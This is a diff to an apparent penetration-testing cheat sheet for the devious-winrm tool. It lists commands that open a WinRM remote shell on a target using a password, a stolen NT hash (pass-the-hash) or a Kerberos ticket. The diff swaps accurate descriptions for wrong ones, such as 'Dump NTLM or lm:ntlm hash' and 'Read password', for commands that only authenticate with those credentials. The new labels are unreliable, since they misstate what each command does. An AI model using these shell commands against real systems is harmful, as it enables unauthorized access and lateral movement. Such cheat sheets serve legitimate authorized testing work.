@@ -4,9 +4,9 @@
 
 ### password
 
-Open a WinRM shell on the target with cleartext password auth. devious-winrm is a modern evil-winrm replacement with better PSReadline handling.
+Read password with Devious-WinRM.
 
-```sh title:"WinRM shell authenticated with password"
+```sh title:"Devious WinRM Read Password"
 devious-winrm -u $user -p $pass $rhost_name
 ```
 <!-- cheat
@@ -18,9 +18,9 @@ var rhost_name
 
 ### ntlm or lm:ntlm hash
 
-WinRM shell authenticated via NT hash (pass-the-hash). Use after dumping SAM/NTDS or after hash capture from SMB relay.
+Dump NTLM or lm:ntlm hash with Devious-WinRM.
 
-```sh title:"WinRM pass-the-hash shell with NT hash"
+```sh title:"Devious WinRM Dump NTLM or Lm:ntlm Hash"
 devious-winrm -u $user -H $hash $rhost_name
 ```
 <!-- cheat
@@ -33,9 +33,9 @@ var rhost_name
 
 ### kerberos
 
-WinRM shell using a ccache TGT (`-k` reads `KRB5CCNAME`). Required when only Kerberos auth is enabled or when passing tickets after S4U / coercion.
+Read kerberos with Devious-WinRM.
 
-```sh title:"WinRM shell authenticated with ccache TGT"
+```sh title:"Devious WinRM Read Kerberos"
 devious-winrm -u $user -k --dc $rhost_name $rhost_name
 ```
 <!-- cheat
